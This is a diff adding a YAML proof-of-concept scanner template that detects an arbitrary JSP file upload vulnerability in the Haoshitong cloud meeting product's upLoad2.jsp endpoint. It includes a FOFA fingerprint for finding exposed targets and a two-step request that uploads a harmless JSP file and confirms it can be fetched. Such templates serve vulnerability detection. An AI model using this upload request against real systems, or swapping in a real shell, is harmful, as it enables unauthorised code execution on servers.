@@ -1,0 +1,32 @@
+id: poc-yaml-hst-yunhuiyi-upload2jsp-anyfile-upload
+info:
+  name: 好视通云会议 upLoad2.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 好视通云会议
+  fofa: app="好视通-云会议"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /fm/systemConfig/upLoad2.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
+  data: "--1515df1sdfdsfddfs\nContent-Disposition: form-data; name=\"file\"; filename=\"\
+    {{.filename}}.jsp\"\nContent-Type: application/octet-stream\n\n<%@ page contentType=\"\
+    text/plain\" %>\n<%\n    out.print(\"{{.content}}\");\n%>\n--1515df1sdfdsfddfs--\n"
+  expression: 'status_code == 302 &&
+
+    contains(headers,"text/html")
+
+    '
+- method: POST
+  path: /fm/upload/{{.filename}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
